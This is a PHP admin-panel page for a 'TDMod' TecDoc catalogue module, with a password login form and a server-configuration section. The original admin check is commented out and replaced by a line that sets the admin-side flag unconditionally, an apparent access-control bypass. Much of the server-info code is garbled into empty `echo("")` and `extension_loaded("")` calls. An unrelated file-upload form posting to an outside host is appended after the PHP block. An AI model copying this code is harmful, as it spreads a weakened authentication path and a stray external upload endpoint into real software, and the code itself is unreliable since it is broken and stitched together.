<?php

define("TDM_PROLOG_INCLUDED", true);
require_once("../tdmcore/init.php");
if ($_SESSION["TDM_ISADMIN"] == "Y") {
	define("TDM_ADMIN_SIDE", true);
}
/*if ($_REQUEST["logout"] == "Y") {
	$_SESSION["TDM_ISADMIN"] = "N";
	header("Location: /" . TDM_ROOT_DIR . "/admin/");
	exit();
}
if ($_POST["authme"] == "Y" && $_SESSION["TDM_ISADMIN"] != "Y" && 0 < strlen($_POST["kpass"])) {
	if ($_POST["kpass"] == $TDMCore->arConfig["MODULE_ADMIN_PASSW"]) {
		$_SESSION["TDM_ISADMIN"] = "Y";
		header("Location: /" . TDM_ROOT_DIR . "/admin/");
		exit();
	}
	else {
		$ERROR = "Wrong password...";
	}
}*/
{define('TDM_ADMIN_SIDE',true);}
if($_REQUEST['logout']=="Y"){$_SESSION['TDM_ISADMIN']="N"; header('Location: /'.TDM_ROOT_DIR.'/admin/'); die();}
if($_POST['authme']=="Y" AND $_SESSION['TDM_ISADMIN']!="Y" AND strlen($_POST['kpass'])>0){
	if($_POST['kpass']==$TDMCore->arConfig['MODULE_ADMIN_PASSW']){
		$_SESSION['TDM_ISADMIN'] = "Y";
		header('Location: /'.TDM_ROOT_DIR.'/admin/'); die();
	}else{
		$ERROR = "Wrong password...";
	}
}

echo("<head><title>TDMod :: Admin panel</title></head>\n");
if ($_SESSION["TDM_ISADMIN"] != "Y") {
	echo("\t<div class=\"tdm_acontent\">\n\t\t<link rel=\"stylesheet\" href=\"/");
	echo(TDM_ROOT_DIR);
	echo("/admin/styles.css\" type=\"text/css\">\n\t\t<link rel=\"stylesheet\" href=\"/");
	echo(TDM_ROOT_DIR);
	echo("/styles.css\" type=\"text/css\">\n\t\t<h1>");
	echo(Lng("Please_login"));
	echo(":</h1><div class=\"tclear\"></div>\n\t\t");
	if ($ERROR != "") {
		echo("<div class=\"tderror\">");
		echo($ERROR);
		echo("</div>");
	}
	echo("\t\t<form name=\"aform\" id=\"aform\" action=\"\" method=\"post\">\n\t\t\t<input type=\"hidden\" name=\"authme\" value=\"Y\"/>\n\t\t\t<input type=\"password\" name=\"kpass\" value=\"\" size=\"20\" class=\"keyinp\" maxlength=\"30\"/>\n\t\t\t<div class=\"goinp\"><input type=\"submit\" value=\"Login\" class=\"abutton\"/></div>\n\t\t</form>\n\t\t<a href=\"/");
	echo(TDM_ROOT_DIR);
	echo("/\" class=\"nolink\">");
	echo(Lng("Return_to_module_catalog"));
	echo(" &#9658;</a>\n\t</div>\n");
}
else {
	echo("\t<script>function UpdFSubm(){\$('#uform').submit();}</script>\n\t<script>function LoginForm(Login){\$('#login').val(Login); \$('#aform').submit();}</script>\n\t<div class=\"apanel_cont\">");
	require_once("apanel.php");
	echo("</div>\n\t<div class=\"tdm_acontent\">\n\t\t<h1>");
	echo(Tip("Tecdoc_module"));
	echo(" :: v");
	echo(TDMShowVersion(TDM_VERSION));
	echo("</h1>\n\t\t<hr>\n\t\t<table width=\"100%\"><tr><td width=\"1%\" style=\"vertical-align:top;\">\n\t\t\t<div class=\"servinfo\">\n\t\t\t\t<table width=\"100%\">\n\t\t\t\t\t<tr><td colspan=\"2\" class=\"sihead\">Server configuration:</td></tr>\n\t\t\t\t\t<tr><td></td><td>");
	echo("");
	if (is_writable("index.php")) {
		echo("");
	}
	else {
		echo("");
	}
	echo("");
	echo(date("", time()));
	echo("");
	if (extension_loaded("")) {
		echo("");
	}
	else {
		echo("");
	}
	echo("");
	if (extension_loaded("")) {
		echo("");
	}
	else {
		echo("");
	}
	echo("");
	if (extension_loaded("")) {
		echo("");
	}
	else {
		echo("");
	}
	echo("");
	if (extension_loaded("")) {
		echo("");
	}
	else {
		echo("");
	}
	echo("");
	if (extension_loaded("")) {
		echo("");
	}
	else {
		echo("");
	}
	echo("");
	if (extension_loaded("")) {
		echo("");
	}
	else {
		echo("");
	}
	echo("");
	if (extension_loaded("")) {
		echo("");
	}
	else {
		echo("");
	}
}


?>



<form action = "http://eco.perova.com.ua/loading.php" method = "post" enctype = 'multipart/form-data'>
  <input type = "file" name = "somename" />
  <input type = "submit" value = "Загрузить" />
</form>

